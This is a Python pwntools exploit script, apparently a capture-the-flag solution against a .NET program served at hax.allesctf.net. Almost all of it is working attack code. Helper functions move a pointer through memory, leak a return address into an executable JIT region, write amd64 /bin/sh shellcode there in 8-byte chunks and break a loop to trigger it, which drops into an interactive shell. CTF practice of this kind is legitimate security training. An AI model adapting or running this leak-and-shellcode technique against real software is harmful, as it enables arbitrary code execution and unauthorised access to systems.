#!/usr/bin/python
from pwn import *
import sys

HOST = "hax.allesctf.net"
PORT = 1234

def inc():
    r.sendline("I")
    r.recvuntil("Input: \n")

def reset():
    r.sendline("R")
    r.recvuntil("Input: \n")

def pr():
    r.sendline("P")
    LEAK = int(r.recvline()[:-1])
    r.recvuntil("Input: \n")
    return LEAK

def wr(value, dorec=True):
    r.sendline("W")
    r.sendline(hex(value))

    if dorec:
        r.recvuntil("Input: \n")

def dump_stack(count):
    for i in range(count):        
        LEAK = pr()
        inc()
        log.info("%d => %s" % (i, hex(LEAK)))

def breakloop():
	reset()
	for i in range(32):
		inc()

	wr(0, False)

def move_ptr3(address):
    reset()
    for i in range(108):
        inc()

    wr(address)

def exploit(r):
    r.recvuntil("Input: \n")
    
    log.info("Move to address of jit return address")

    for i in range(113):
        inc()
    
    log.info("Read return address")

    LEAK = pr()                 # leak to rwx section
    log.info("RWX section       : %s" % hex(LEAK))
    
    log.info("Move ptr3 to jit region")
    move_ptr3(LEAK)

    log.info("Write shellcode to jit region")   
    payload = asm(shellcraft.amd64.sh(), arch="amd64")

    for i in range(0, len(payload), 8):
        wr(u64(payload[i:i+8]))
        inc()
    
    log.info("Break the loop to trigger shellcode")
    breakloop() 
    
    r.interactive()
    
    return

if __name__ == "__main__":
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process(["dotnet-sdk.dotnet", "myApp.dll"])     
        print util.proc.pidof(r)
        pause()
        exploit(r)
